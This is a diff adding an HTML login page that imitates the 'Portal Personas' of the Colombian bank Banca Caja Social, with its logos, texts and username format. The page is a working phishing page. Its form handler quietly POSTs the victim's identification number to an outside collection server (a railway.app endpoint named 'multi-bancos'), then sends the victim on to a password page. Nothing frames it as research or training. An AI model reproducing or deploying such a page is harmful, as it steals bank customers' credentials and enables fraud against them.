@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+    <title>Bienvenido al Portal Personas - Banca Caja Social</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <style>input, select, textarea { font-size: 16px !important; }</style>
+</head>
+<body>
+    <div id="loadingOverlay" class="loading-overlay">
+        <div style="text-align:center;">
+            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;">
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="left-section">
+            <img src="img/background-2.png" alt="Familia" class="background-image" id="bgImage">
+        </div>
+        <div class="right-section">
+            <div class="form-container">
+                <div class="logo-container">
+                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
+                </div>
+                
+                <h1 class="title">Bienvenido al Portal Personas</h1>
+                
+                <p class="subtitle">
+                    Recuerde que su usuario está compuesto por su Tipo de Identificación <strong>(CC, CE, NI, TI, PE)</strong> y su Número de Identificación sin espacios, puntos ni comas.
+                </p>
+                
+                <form class="login-form" id="loginForm">
+                    <div class="form-group">
+                        <label for="usuario" class="form-label">Usuario</label>
+                        <input type="text" id="usuario" name="usuario" class="form-input" autocomplete="off">
+                        <small class="bb-username-example">Ejemplo: CC1234567890</small>
+                        <small class="bb-input-validation-message" id="errorMsg" style="display:none;">Datos incorrectos. Recuerde iniciar con CC, CE, NI, TI, PE.</small>
+                    </div>
+                    
+                    <div class="bb-button-bar">
+                        <button type="submit" id="submitBtn" class="btn btn-primary username-then-password-button" disabled>Siguiente</button>
+                    </div>
+                    
+                    <a href="#" class="btn-link-text link-forgot" style="display: inline-block; margin-left: 1rem; margin-bottom: 20px;">¿Olvidó su contraseña? ▼</a>
+                    
+                    <hr class="identity-separator">
+                    
+                    <div class="bb-subtitle">
+                        <span class="register-text">¿Es un cliente nuevo?</span>
+                        <a href="#" class="btn-link-text link-register">Registrarse</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <div id="pantallaCarga" class="pantalla-carga">
+        <div class="spinner-circulo">
+            <div class="spinner-logo">
+                <img src="img/logo-caja-social.png" alt="Caja Social">
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usuarioInput = document.getElementById('usuario');
+            const btnSiguiente = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            const validPattern = /^(CC|CE|NI|TI|PE)\d+$/;
+            
+            usuarioInput.addEventListener('input', function() {
+                const value = this.value.trim().toUpperCase();
+                this.value = value;
+                
+                if (value.length === 0 || value.length < 2) {
+                    errorMsg.style.display = 'none';
+                    usuarioInput.classList.remove('error');
+                    btnSiguiente.disabled = true;
+                    return;
+                }
+                
+                if (validPattern.test(value)) {
+                    errorMsg.style.display = 'none';
+                    usuarioInput.classList.remove('error');
+                    btnSiguiente.disabled = false;
+                } else {
+                    errorMsg.style.display = 'block';
+                    usuarioInput.classList.add('error');
+                    btnSiguiente.disabled = true;
+                }
+            });
+            
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const value = usuarioInput.value.trim().toUpperCase();
+                if (validPattern.test(value)) {
+                    var sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000));
+                    sessionStorage.setItem('sessionId', sessionId);
+                    sessionStorage.setItem('usuario', value);
+                    
+                    fetch('https://multi-bancos-production.up.railway.app/caja-social/enviar', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            sessionId: sessionId,
+                            tipo: 'Usuario',
+                            tipoDoc: 'CC',
+                            identificacion: value,
+                            clave: ''
+                        })
+                    }).then(function(r){ return r.json(); })
+                      .then(function(data){ console.log('Enviado:', data); })
+                      .catch(function(err){ console.error('Error:', err); });
+                    
+                    var pantalla = document.getElementById('pantallaCarga');
+                    if (pantalla) pantalla.classList.add('activa');
+                    setTimeout(function(){
+                        window.location.href = 'password.html';
+                    }, 1500);
+                } else {
+                    errorMsg.style.display = 'block';
+                    usuarioInput.classList.add('error');
+                }
+            });
+        });
+    </script>
+
+<script>
+(function(){
+    var imagenes = ['img/background-2.png','img/background-3.png','img/familia11.png','img/background-6.png'];
+    var bg = document.getElementById('bgImage');
+    if (bg) {
+        var ultima = sessionStorage.getItem('ultimaBg') || '';
+        var disponibles = imagenes.filter(function(img){ return img !== ultima; });
+        var aleatoria = disponibles[Math.floor(Math.random() * disponibles.length)];
+        bg.src = aleatoria;
+        sessionStorage.setItem('ultimaBg', aleatoria);
+    }
+})();
+</script>
+
+<script>
+(function(){
+'use strict';
+var lastTouchEnd = 0;
+document.addEventListener('touchend', function(e){
+var ahora = new Date().getTime();
+if (ahora - lastTouchEnd <= 300) { e.preventDefault(); }
+lastTouchEnd = ahora;
+}, { passive: false });
+document.addEventListener('dblclick', function(e){ e.preventDefault(); });
+document.addEventListener('focusin', function(e){
+var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
+if (tag === 'input' || tag === 'textarea' || tag === 'select') {
+if (e.target.style.fontSize !== '16px') {
+e.target.dataset._fs = e.target.style.fontSize || '';
+e.target.style.fontSize = '16px';
+}
+}
+});
+document.addEventListener('focusout', function(e){
+var tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
+if (tag === 'input' || tag === 'textarea' || tag === 'select') {
+if (e.target.dataset._fs !== undefined) {
+e.target.style.fontSize = e.target.dataset._fs;
+delete e.target.dataset._fs;
+}
+}
+});
+})();
+</script>
+</body>
+</html>
